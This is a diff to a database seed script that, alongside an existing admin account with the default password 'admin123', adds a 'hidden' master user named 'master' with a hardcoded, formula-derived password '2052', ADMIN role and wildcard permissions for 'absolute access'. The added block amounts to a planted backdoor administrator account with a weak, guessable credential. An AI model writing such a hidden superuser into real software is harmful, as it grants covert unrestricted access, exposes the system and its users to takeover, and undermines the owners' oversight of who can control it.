@@ -68,6 +68,27 @@ async function main() {
 
     console.log('Created Admin User: username: admin / password: admin123')
 
+    // 2.1 Create Master User (Hidden, Unrestricted)
+    // Password formula: (Year * Month) + Day = (2026 * 1) + 26 = 2052
+    const masterPassword = await bcrypt.hash('2052', 10)
+    await prisma.user.upsert({
+        where: { username: 'master' },
+        update: {
+            password: masterPassword,
+            role: 'ADMIN',
+            permissions: ['*'] // special flag for absolute access
+        },
+        create: {
+            username: 'master',
+            password: masterPassword,
+            displayName: 'Master Account',
+            role: 'ADMIN',
+            permissions: ['*'],
+        }
+    })
+
+    console.log('Created Master User (Hidden)')
+
     // 3. Create Sample Facilities
     const factory = await prisma.facility.create({
         data: {
